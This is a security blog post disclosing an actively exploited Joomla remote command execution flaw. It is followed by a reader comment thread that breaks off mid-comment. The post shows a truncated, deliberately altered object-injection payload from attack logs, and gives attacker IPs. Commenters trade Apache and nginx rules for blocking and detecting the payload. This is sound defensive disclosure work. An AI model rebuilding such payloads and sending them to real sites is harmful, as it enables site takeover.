<p class="entry-meta"><time class="entry-time" datetime="2015-12-14T16:17:33-08:00">December 14, 2015</time><span class="entry-author"><a href="https://blog.sucuri.net/author/dcid" class="entry-author-link" rel="author"><span class="entry-author-name">Daniel Cid</span></a></span></p></header><div class="entry-content"><aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-count mash-small" style="float:left;"><div class="counts mashsbcount">1.5k</div><span class="mashsb-sharetext">SHARES</span></div><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2015%2F12%2Fremote-command-execution-vulnerability-in-joomla.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Critical%200-day%20Remote%20Command%20Execution%20Vulnerability%20in%20Joomla&url=https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--><p><strong>Nov 2016 Update:</strong> If you need to clean your hacked Joomla site, we have released a new free guide to show you how to identify and remove hacks.</p>
<p style="text-align: center;"><a class="button" href="https://sucuri.net/guides/how-to-clean-hacked-joomla" target="_blank">Read the Guide!</a></p>
<p>The Joomla security team have just released a new version of Joomla to <a href="https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html">patch</a> a critical remote command execution vulnerability that affects all versions from 1.5 to 3.4.</p>
<p>This is a serious vulnerability that can be easily exploited and is already in the wild. If you are using Joomla, you have to <a href="https://www.joomla.org/announcements/release-news/5641-joomla-3-4-6-released.html">update</a> it right now. If you need <a class="external-link" href="https://sucuri.net/website-security/joomla-malware-removal/" rel="nofollow">joomla security</a> and malware removal, contact our team.</p>
<p><b>Update &#8211; 2015/12/14, 17:15PM EST</b> If you are using the old (unsupported) versions 1.5.x and 2.5.x, you have to apply the hotfixes from <a href="https://docs.joomla.org/Security_hotfixes_for_Joomla_EOL_versions">here</a>. This <a href="https://www.ostraining.com/blog/joomla/hotfixes/">article</a> from OSTraining explains how to apply them.</p>
<p><span id="more-14358"></span></p>
<h2>Zero day Exploits in the Wild</h2>
<p>What is very concerning is that this vulnerability is already being exploited in the wild and has been for the last 2 days. Repeat: This has been in the wild as a 0-day for 2 days before there was a patch available.</p>
<p>Looking back at our logs, we detected the first exploit targeting this vulnerability on Dec 12, at 4:49PM:</p>
<pre><b>2015 Dec 12 16:49:07</b> clienyhidden.access.log
 Src IP: <b>74.3.170.33 / CAN / Alberta</b>
 74.3.170.33 - - [12/Dec/2015:16:49:40 -0500] "GET /contact/ HTTP/1.1" 403 5322 "http://google.com/" "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3: ..
 {s:2:\x22fc\x22;O:17:\x22JSimplepieFactory\x22:0: .. {}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:..
 {s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:8:\x22feed_url\x22;s:60:..</pre>
<p>We modified the payload so it can&#8217;t be misused, but the attackers are doing an object injection via the HTTP user agent that leads to a full remote command execution.</p>
<p>We detected more exploits from this same IP address &#8220;74.3.170.33&#8221; on Dec 12th, followed by hundreds more exploit attempts from 146.0.72.83 and 194.28.174.106 on Dec 13th.</p>
<p>Today (Dec 14th), the wave of attacks is even bigger, with basically every site and honeypot we have being attacked. That means that probably every other Joomla site out there is being targeted as well.</p>
<h2>Protect Your Site Now</h2>
<p>If you are a Joomla user, check your logs right away. Look for requests from <strong>146.0.72.83</strong> or <strong>74.3.170.33</strong> or <strong>194.28.174.106</strong> as they were the first IP addresses to start the exploitation. I also recommend searching your logs for &#8220;<strong>JDatabaseDriverMysqli</strong>&#8221; or &#8220;<strong>O:</strong>&#8221; in the User Agent as it has been used in the exploits. If you find them, consider your Joomla site compromised and move to the remediation / incident response phase.</p>
<p>Note that clients behind the <a href="https://sucuri.net/website-firewall/">Sucuri Firewall</a> were already protected against this threat and are safe. Yes, our virtual patching for the HTTP User Agent kept our users protected against this exploit.</p>
<h2><b>If You Use Joomla, Update ASAP!</b></h2>
<p>For those on the <strong>3.x branch</strong>, update immediately to <strong>3.4.6.</strong> There will be <a href="https://docs.joomla.org/Security_hotfixes_for_Joomla_EOL_versions" target="_blank">unofficial fixes for Joomla! <strong>1.5.x and 2.5.x</strong></a> provided soon. Anyone using those versions should stay aware and update as soon as possible.</p>
<p>We are still monitoring the issue and will provide more updates as we learn more. If you require <a href="https://sucuri.net/website-security/joomla-malware-removal/" target="_blank">Joomla malware cleanup</a> services, our team is happy to help restore, protect, and monitor your site going forward.</p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-count mash-small" style="float:left;"><div class="counts mashsbcount">1.5k</div><span class="mashsb-sharetext">SHARES</span></div><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2015%2F12%2Fremote-command-execution-vulnerability-in-joomla.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Critical%200-day%20Remote%20Command%20Execution%20Vulnerability%20in%20Joomla&url=https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/joomla-security" rel="category tag">Joomla Security</a>, <a href="https://blog.sucuri.net/category/vulnerability-disclosure" rel="category tag">Vulnerability Disclosure</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/zero-day" rel="tag">Zero-Day</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy'/><h4 class="author-box-title">About <span itemprop="name">Daniel Cid</span></h4><div class="author-box-content" itemprop="description"><p>Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the  GoDaddy Security Products group. He is also the founder of OSSEC and <a href="https://cleanbrowsing.org">CleanBrowsing</a>.  You can find more about Daniel on his site <a href="http://dcid.me">dcid.me</a> or on <a href="https://twitter.com/danielcid">Twitter: @danielcid</a></p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2><div class="entry-comments" id="comments"><h3>Comments</h3><ol class="comment-list">
	<li class="comment even thread-even depth-1" id="comment-7037">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="https://www.saotn.org" class="comment-author-link" rel="external nofollow" itemprop="url">Jan R</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T18:04:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7037">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>To mitigate the attacks before updating Joomla, would it be sufficient to deny &#8220;strange&#8221; user-agent strings? For example in your .htaccess to deny user-agent strings containing an accolade { :</p>
<p><code>RewriteCond %{HTTP_USER_AGENT} .*{.* [NC]<br />
RewriteRule .* - [F,L]</code></p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7039">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/79082c22d49ed5d836e3eae8da00dada?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/79082c22d49ed5d836e3eae8da00dada?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://evandrix.github.io" class="comment-author-link" rel="external nofollow" itemprop="url">Lee Wei Yeong</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T18:35:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7039">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Any equivalent rule for `nginx`?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-7041">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/e63b10e3b702211edd89fef5df4178d2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e63b10e3b702211edd89fef5df4178d2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="https://ionutlupu.me" class="comment-author-link" rel="external nofollow" itemprop="url">ionut</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T19:18:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7041">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Try with this inside your server block:</p>
<p>if ( $http_user_agent ~* ({|}) ) {<br />
        return 403;<br />
}</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-7045">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T20:55:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7045">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>That would work. I would also recommend blocking O:[0-9] as an additional hardening.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-7058">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/9825eca67c0a45c4217628fd7b817138?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/9825eca67c0a45c4217628fd7b817138?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Marco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:10:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7058">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Warning, from my apache logs, some users use those kinds of user-agent :</p>
<p>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SIMBAR={19D004AF-08EA-11E2-BEF2-000000000000}; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; MSOffice 12)</p>
<p>Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; BTRS121932; SIMBAR={1605FC0C-5EB7-4998-85F3-AB145EAFDD05}; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; TmstmpExt)</p>
<p>You should try :<br />
<code><br />
    RewriteCond %{HTTP_USER_AGENT} O:[0-9]+: [NC]<br />
    RewriteRule .* - [F]<br />
</code></p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-7084">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="https://www.saotn.org" class="comment-author-link" rel="external nofollow" itemprop="url">Jan R</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T05:20:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7084">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for your reply Marco! Sometimes you have to take drastic measures which may block legitimate visitors. However, such mitigation measures should never be in place for longer than a day or so, only in between the time of hearing about the exploit and updating Joomla.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-3" id="comment-7097">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ffc55135ca520a10abb514ff03d144f0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ffc55135ca520a10abb514ff03d144f0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Esa Jokinen</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T13:31:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7097">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>As mod_rewrite doesn&#8217;t work on Apache server level without &#8220;RewriteOption InheritDown&#8221; (available from Apache 2.4.8) I&#8217;d suggest using BrowserMatch directive instead (in conf.d/):</p>
<p><code>BrowserMatch O:[0-9] joomla-exploit-workaround</p>
<p>   Deny from env=joomla-exploit-workaround<br />
</code></p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7038">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/caa5fd2d084d87ee1454c4314b7c21d2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/caa5fd2d084d87ee1454c4314b7c21d2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://brian.teeman.net" class="comment-author-link" rel="external nofollow" itemprop="url">Brian Teeman</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T18:31:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7038">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>As always Sucuri chose to promote their own services first &#8211; sad</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-7047">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:01:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7047">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>We are proud of what we do here. We are proud that our work can protect our clients even from some 0-day exploits going out there.</p>
<p>But this post is far from promoting ourselves. In fact, we only mentioned it to let our clients know that they are safe/protected.</p>
<p>Anyone else can either update Joomla, use ModSecurity or any other WAF to protect themselves.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-7048">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/bb2a6e85307e20ae78274f527a180f4b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/bb2a6e85307e20ae78274f527a180f4b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Canuckistani</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:05:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7048">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>It&#8217;s their website, it&#8217;s their article and it highlights what their service is finding. They should be hyping up their own services on their own website &#8211; nobody works for free!</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-7066">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Phil Taylor</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:38:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7066">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>They only found it once it was reported by the Joomla team and they searched their historic log files!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-7055">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://perezbox.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Tony Perez</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:30:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7055">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hey @brianteeman:disqus  </p>
<p>Too bad you didn&#8217;t feel you could come to me with this concern. </p>
<p>As my partner explained, we are in fact very proud of what we do here. We do more to bring awareness to the issue than most realize, and we report on what we&#8217;re seeing via our network to help provide perspective and context. So yes, if we reference that our customers are in fact protected, being it&#8217;s a question we&#8217;ll get asked, then sincerest apologies for the inconvenience. </p>
<p>Too bad though.. </p>
<p>Tony</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-7074">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/8ff7688dd7aaf66effb89c65203ee7c3?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8ff7688dd7aaf66effb89c65203ee7c3?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jrme Segura</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T00:24:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7074">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Well said Tony </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-3" id="comment-7137">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Alan Langford</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T16:41:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7137">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I think Brian&#8217;s concern, although not well phrased, is that your reports tend to offer too much information during a period where site administrators may not have had a chance to update their sites. There are a lot of administrators who are lax when it comes to updating. Although the exploit is available in the hacker community, I don&#8217;t think it&#8217;s safe to assume that all potential hackers are sufficiently plugged into that community to be aware of the details. By publishing the details of the exploit simultaneously with the availability of the patch, those of us on this side of the fence feel that you&#8217;re giving people a tool to go and do significant damage, all for being able to take credit for breaking the news.</p>
<p>I for one would be much happier if you announced the vulnerability in more general terms at the time the update was made available, but withheld the technical details for several days. Granted this is less of an issue when the exploit is in the wild, but you have done this with undisclosed vulnerabilities, and I personally feel that put a lot of sites at risk for no good reason.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-4" id="comment-7142">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/72345495398482431830b8470c59a582?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/72345495398482431830b8470c59a582?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Alycia</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T17:13:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7142">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>There is no POC in the post, so unsure about giving people a tool to go<br />
 and do significant damage? The post does provide IPs for admins to watch for. In my humble opinion, any major RCE vulnerability will<br />
attract hackers to seek underground discussions&#8230;. no matter how<br />
 general you keep the disclosure among whitehats.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-4" id="comment-7148">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://perezbox.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Tony Perez</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T20:24:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7148">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi @abivia:disqus </p>
<p>I&#8217;m pretty sure I understand @brianteeman:disqus intent pretty well. </p>
<p>As for your points on what, specifically how much we provide. Our position is, and continues to be that we&#8217;ll disclose whatever information we have available that is already public knowledge. This was an active Zero day, needed to be shared and we use what we have at our disposal to get the information out.</p>
<p>Something to consider. In your argument you are focusing on the &#8220;lax&#8221; administrator; in turn we&#8217;re focusing on the proactive ones. Those that care, and use the information we share to protect their properties. There is little we can do for those that don&#8217;t care.</p>
<p>What we share is valuable, and it makes a difference. There are two sides to the fence, and there are just as many administrators thanking us, as those that share similar sentiments as to those you have expressed. </p>
<p>Thank you though, for sharing your thoughts. </p>
<p>Tony</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-5" id="comment-7153">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Alan Langford</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T22:34:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7153">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>My consideration of the &#8220;lax&#8221; administrator comes from considerable experience. There are several sub-cases of this, the worst being someone who built a site for a customer, gave them no guidance on maintenance, and moved on. These are the sites running things like Joomla 1.5.6 and frankly I have no idea how they survive unscathed. These administrators don&#8217;t even know what a security advisory is and there&#8217;s not much we can do about that.</p>
<p>However there are a lot of reasonably responsible administrators who are also small business owners where their website is a necessary but non-critical part of their business. Some of them have day jobs. Some of them travel. Some of them have calendars booked days in advance. Anecdotally, I&#8217;d submit that the vast majority of Joomla and WordPress sites fall into this category. As far as I&#8217;m concerned, anything that increases the risk of their site being attacked before they can find the time to perform an upgrade is non-optimal.</p>
<p>To be clear, I have no issue with the release of information that&#8217;s tangential to the exploit such as IP source addresses, and I realize that not publishing won&#8217;t deter a serious hacker from getting his hands on the exploit. One of the joys of open source is that a simple diff on the update frequently exposes the nature of the vulnerability. Yet as far as I&#8217;m concerned, anything that makes it a little more difficult&#8211;even for the curious amateur hacker&#8211;is a good thing because it might just buy someone the few days they need to find the time to update. This is particularly so at a time of year when we&#8217;ve got a lot of bored university students who have finished exams and can&#8217;t find anything better to do.</p>
<p>I realize that administrators who are on the ball appreciate full disclosure, but at the same time those will be the administrators who have patched their systems, or who can afford to make use of your services. They&#8217;re at less risk, by definition. Meanwhile, collating all the &#8220;public&#8221; information and releasing it as the patch becomes available clearly does not benefit the people who can&#8217;t drop everything and patch, or those who can&#8217;t afford your services.</p>
<p>I don&#8217;t expect you to change your policies. After all, somewhere between the responsible administrators and the people who can&#8217;t afford you is your pool of new customers, and what could better focus their attention than getting hacked? I&#8217;m just elaborating on why you might be the subject of the occasional frustrated remark.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7158">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://perezbox.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Tony Perez</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-17T15:45:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7158">December 17, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi @abivia:disqus </p>
<p>All fair points. </p>
<p>There are obviously a number of counter points that can be made, but alas we&#8217;d get into a philosophical debate in which there really is no right or wrong, only perspective and personal opinion. Thanks though for sharing your concerns and insights. </p>
<p>Tony</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even depth-4" id="comment-7151">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

